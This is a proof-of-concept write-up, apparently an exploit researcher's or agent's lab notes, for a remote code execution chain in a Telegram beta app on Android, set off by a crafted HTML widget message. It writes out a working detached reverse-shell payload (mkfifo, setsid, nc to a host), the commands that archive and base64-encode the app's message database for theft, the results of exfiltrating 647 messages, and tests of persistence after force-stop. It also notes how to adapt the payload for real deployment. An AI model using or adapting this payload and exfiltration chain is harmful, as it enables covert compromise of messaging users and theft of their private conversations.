# Detached reverse shell + network exfiltration (2026-11-01)

Goal: a PoC that works **despite** the widget/sandbox limits — no `adb pull`,
no reliance on the app process surviving after `system()`.

## Payload

`lab/qjs_postsnapshot/widget_poc_1865_revshell.html` (v2 base, 10,469 B).

The endgame command is changed from the proof write to:

```sh
rm -f /data/user/0/org.telegram.messenger.beta/cache/.rs
mkfifo /data/user/0/org.telegram.messenger.beta/cache/.rs
setsid sh -c 'cat /data/user/0/org.telegram.messenger.beta/cache/.rs \
  | /system/bin/sh 2>&1 \
  | /system/bin/toybox nc HOST PORT \
  > /data/user/0/org.telegram.messenger.beta/cache/.rs' \
  </dev/null >/dev/null 2>&1 &
echo RS
```

- `setsid` puts the shell/nc pipeline in a **new session**, outside the app’s
  process group.
- The FIFO loop gives a bidirectional shell: host → `nc` → FIFO → `cat` → `sh`;
  `sh` output → `nc` → host.
- `system()` returns immediately after backgrounding; the app may crash, the
  shell does not depend on it.
- The shell runs as the Telegram app UID (`u0_a357`, `untrusted_app`), with the
  app’s `INTERNET` permission. No root.

## Test

Host listener: `tools/rev_listener.py` (or `nc -l -p 4444`).
Device-to-host transport for the lab: `adb reverse tcp:4444 tcp:4444`; the
payload connects to `127.0.0.1:4444`. For a real deployment use the host’s
LAN/public IP and port.

1. Patch message 79415 with `widget_poc_1865_revshell.html`; restart; open the
   chat.
2. The exploit runs S0→S6 and calls `system()`; the shell connects.
3. Host sends `id; echo REV_MARK` → receives:

```
uid=10357(u0_a357) gid=10357(u0_a357) groups=10357(u0_a357),1079(ext_obb_rw),…
context=u:r:untrusted_app:s0:c101,c257,c512,c768
REV_MARK
```

4. Host sends:

```sh
tar -czf /data/user/0/org.telegram.messenger.beta/cache/db.tgz \
  /data/data/org.telegram.messenger.beta/files/cache4.db*
ls -l /data/user/0/org.telegram.messenger.beta/cache/db.tgz
base64 /data/user/0/org.telegram.messenger.beta/cache/db.tgz
```

5. Host receives **2,646,167 bytes** of base64 → 1,958,765-byte gzip tar:
   `cache4.db` (4,575,232 B), `cache4.db-wal` (1,569,752 B), `cache4.db-shm`
   (32,768 B).

## Result

- The shell was reached as the app UID; no `adb pull`, no root.
- The Telegram DB was exfiltrated over the network while the app process was
  already gone: `ps` showed no `org.telegram.messenger.beta` after the run, yet
  the reverse shell completed the transfer.
- The extracted DB opened normally: 20+ Telegram tables, **647 messages** in
  `messages_v2`; message 79415 (the widget) present. The DB copy is sensitive
  and is kept only in `/tmp/opencode/rev_db_extract/`; it is not archived in the
  project.
- The app crashed after `system()` (expected: `rt->mf.js_free = system`); the
  `setsid` child survived long enough to finish the transfer. After the host
  listener closed, the child exited.
- The PoC does **not** give root; it reads only the app’s own data.

## Limits

- **App UID only**: app data/network; no other packages, `/data/system`, root.
- **LMK/force-stop** can kill the detached child; `setsid` reduces the risk but
  does not make it unkillable. A long transfer should be streamed/compressed.
- **One-shot** `system()` per exploit run; all steps must be in one shell string.
- **Sandbox wall (~5 s)** may kill the widget thread/process; the reverse shell
  is backgrounded, so the transfer is not tied to the JS task.
- **Network reachability**: the app UID can use TCP; the host must be reachable
  (LAN or relay). `adb reverse` was used only in the lab.
- **DB consistency**: include `-wal`/`-shm`; open offline.

## Artifacts

- `lab/qjs_postsnapshot/widget_poc_1865_revshell.html` — PoC payload.
- `tools/rev_listener.py` — host listener (lab).
- `evidence/evidence_20261101/revshell/rev_shell_out.txt` — sanitized `id` output.
- `/tmp/opencode/rev_db_extract/` — exfiltrated DB (sensitive, not in the repo).
- `/tmp/opencode/rev_db.b64`, `rev_db.tgz` — transfer captures (sensitive).

## Addendum 2026-11-01: `am force-stop` kills app-UID detached shells

The detached-shell trick survives an app **crash** (the original PoC), but it does
**not** survive `am force-stop` on this Android 13 device. A watcher script
(`setsid`, own session, stdin/out/err to `/dev/null`) deployed through the widget
RCE ran as `uid=10357` and connected to the host; `am force-stop` closed the
connection, removed `/proc/<watcher>` and `/proc/<supervisor>`, and no reconnect
followed the restart. The same script run as root survived force-stop and
reconnected, so the kill is UID/cgroup-based, not a script bug. Consequence: an
app-UID-only persistence watcher cannot meet "comes back after `am force-stop`".
Details: `notes/persistence_20261101.md`; evidence:
`evidence/evidence_20261101/persistence/`.
